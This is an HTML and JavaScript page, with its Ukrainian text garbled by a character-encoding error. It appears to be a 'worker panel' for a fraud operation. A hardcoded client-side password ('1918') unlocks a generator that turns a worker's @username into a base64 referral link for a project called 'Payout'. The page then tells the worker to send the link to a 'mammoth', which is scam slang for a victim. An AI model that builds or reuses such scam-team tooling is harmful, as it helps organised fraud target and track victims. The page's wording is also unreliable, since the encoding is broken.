<!DOCTYPE html>
<html lang="uk">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>–ü–∞–Ω–µ–ª—å –í–æ—Ä–∫–µ—Ä—ñ–≤</title>
    <style>
        * {
            box-sizing: border-box;
            margin: 0;
            padding: 0;
        }
        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
            background: #0f172a;
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            color: #e2e8f0;
            overflow: hidden;
        }
        .container {
            width: 90%;
            max-width: 400px;
            text-align: center;
        }
        .panel {
            background: rgba(15, 23, 42, 0.95);
            border-radius: 24px;
            padding: 40px 30px;
            box-shadow: 0 20px 40px rgba(0, 0, 0, 0.3);
            backdrop-filter: blur(12px);
            border: 1px solid rgba(34, 211, 238, 0.2);
            transition: all 0.3s ease;
        }
        .panel:hover {
            box-shadow: 0 25px 50px rgba(34, 211, 238, 0.15);
        }
        .logo {
            width: 80px;
            height: 80px;
            margin: 0 auto 24px;
            background: radial-gradient(circle at 30% 30%, #22d3ee, #06b6d4);
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
            font-size: 36px;
            color: #0f172a;
            font-weight: bold;
        }
        .logo.shield {
            background: radial-gradient(circle at 30% 30%, #22d3ee, #0891b2);
        }
        h1 {
            font-size: 24px;
            font-weight: 600;
            margin-bottom: 32px;
            color: #22d3ee;
            text-shadow: 0 0 10px rgba(34, 211, 238, 0.3);
        }
        .input-group {
            margin-bottom: 24px;
            position: relative;
        }
        .input-field {
            width: 100%;
            padding: 16px 20px 16px 50px;
            background: rgba(30, 41, 59, 0.8);
            border: 1px solid rgba(148, 163, 184, 0.3);
            border-radius: 16px;
            color: #e2e8f0;
            font-size: 16px;
            outline: none;
            transition: all 0.3s ease;
        }
        .input-field:focus {
            border-color: #22d3ee;
            box-shadow: 0 0 0 3px rgba(34, 211, 238, 0.2);
        }
        .input-icon {
            position: absolute;
            left: 16px;
            top: 50%;
            transform: translateY(-50%);
            color: #94a3b8;
            font-size: 18px;
        }
        .btn {
            width: 100%;
            padding: 16px;
            background: linear-gradient(135deg, #22d3ee, #06b6d4);
            border: none;
            border-radius: 16px;
            color: #0f172a;
            font-size: 18px;
            font-weight: 600;
            cursor: pointer;
            transition: all 0.3s ease;
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 10px;
        }
        .btn:hover {
            background: linear-gradient(135deg, #06b6d4, #0891b2);
            transform: translateY(-2px);
            box-shadow: 0 10px 20px rgba(34, 211, 238, 0.3);
        }
        .btn:active {
            transform: translateY(0);
        }
        #result {
            margin-top: 24px;
            font-size: 14px;
            line-height: 1.6;
            color: #cbd5e1;
        }
        #result a {
            color: #22d3ee;
            text-decoration: none;
            font-weight: 500;
        }
        #result a:hover {
            text-decoration: underline;
        }
        .hidden {
            display: none;
        }
        .error {
            color: #f87171;
            font-size: 14px;
            margin-top: 10px;
        }
    </style>
</head>
<body>
    <div class="container">

        <!-- –≠–∫—Ä–∞–Ω –≤—Ö–æ–¥–∞ -->
        <div id="loginScreen" class="panel">
            <div class="logo shield">üîí</div>
            <h1>–í—Ö—ñ–¥ —É –ø–∞–Ω–µ–ª—å</h1>
            <div class="input-group">
                <span class="input-icon">üîë</span>
                <input type="password" id="password" class="input-field" placeholder="–í–≤–µ–¥—ñ—Ç—å –ø–∞—Ä–æ–ª—å">
            </div>
            <button class="btn" onclick="checkPassword()">
                <span>–£–≤—ñ–π—Ç–∏</span>
                <span>‚ûú</span>
            </button>
            <p class="error hidden" id="errorMsg">–ù–µ–≤—ñ—Ä–Ω–∏–π –ø–∞—Ä–æ–ª—å!</p>
        </div>

        <!-- –ì–µ–Ω–µ—Ä–∞—Ç–æ—Ä —Å—Å—ã–ª–æ–∫ -->
        <div id="generatorScreen" class="panel hidden">
            <div class="logo">‚àû</div>
            <h1>–ì–µ–Ω–µ—Ä–∞—Ç–æ—Ä –ø–æ—Å–∏–ª–∞–Ω—å</h1>
            <div class="input-group">
                <span class="input-icon">üíé</span>
                <select class="input-field" id="projectSelect">
                    <option value="">–û–±–µ—Ä—ñ—Ç—å –ø—Ä–æ–µ–∫—Ç</option>
                    <option value="viplata">–í–∏–ø–ª–∞—Ç–∞</option>
                </select>
            </div>
            <div class="input-group">
                <span class="input-icon">@</span>
                <input type="text" id="username" class="input-field" placeholder="@username –≤–æ—Ä–∫–µ—Ä–∞">
            </div>
            <button class="btn" onclick="generateLink()">
                <span>–°—Ç–≤–æ—Ä–∏—Ç–∏ –ø–æ—Å–∏–ª–∞–Ω–Ω—è</span>
                <span>‚úçÔ∏è</span>
            </button>
            <div id="result"></div>
        </div>

    </div>

    <script>
        const correctPassword = "1918";

        function checkPassword() {
            const input = document.getElementById('password').value;
            const error = document.getElementById('errorMsg');

            if (input === correctPassword) {
                document.getElementById('loginScreen').classList.add('hidden');
                document.getElementById('generatorScreen').classList.remove('hidden');
                error.classList.add('hidden');
            } else {
                error.classList.remove('hidden');
                document.getElementById('password').value = '';
            }
        }

        function generateLink() {
            const project = document.getElementById('projectSelect').value;
            const username = document.getElementById('username').value.trim();
            const resultDiv = document.getElementById('result');

            if (!project) {
                resultDiv.innerHTML = `<p style="color:#f87171;">–û–±–µ—Ä—ñ—Ç—å –ø—Ä–æ–µ–∫—Ç!</p>`;
                return;
            }
            if (!username || !username.startsWith('@') || username.length < 2) {
                resultDiv.innerHTML = `<p style="color:#f87171;">–í–≤–µ–¥—ñ—Ç—å –∫–æ—Ä–µ–∫—Ç–Ω–∏–π @username</p>`;
                return;
            }

            const nick = username.substring(1);
            let refCode;
            try {
                refCode = btoa(nick);
            } catch (e) {
                resultDiv.innerHTML = `<p style="color:#f87171;">–ü–æ–º–∏–ª–∫–∞: –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É–π –ª–∞—Ç–∏–Ω—Å—å–∫—ñ –ª—ñ—Ç–µ—Ä–∏, —Ü–∏—Ñ—Ä–∏, _</p>`;
                return;
            }

            const currentDomain = window.location.origin;
            const refLink = `${currentDomain}/?ref=${encodeURIComponent(refCode)}`;

            resultDiv.innerHTML = `
                <p>–¢–≤–æ—è —É–Ω—ñ–∫–∞–ª—å–Ω–∞ –ø–æ—Å–∏–ª–∞–Ω–Ω—è:</p>
                <strong><a href="${refLink}" target="_blank">${refLink}</a></strong>
                <p style="margin-top:12px; font-size:13px;">–ù–∞–¥—ñ—à–ª–∏ —ó—ó –º–∞–º–æ–Ω—Ç—É!</p>
            `;
        }

        // –ü–æ–¥–¥–µ—Ä–∂–∫–∞ Enter –≤ –ø–æ–ª–µ –ø–∞—Ä–æ–ª—è
        document.getElementById('password').addEventListener('keypress', function(e) {
            if (e.key === 'Enter') checkPassword();
        });
    </script>
</body>
</html>
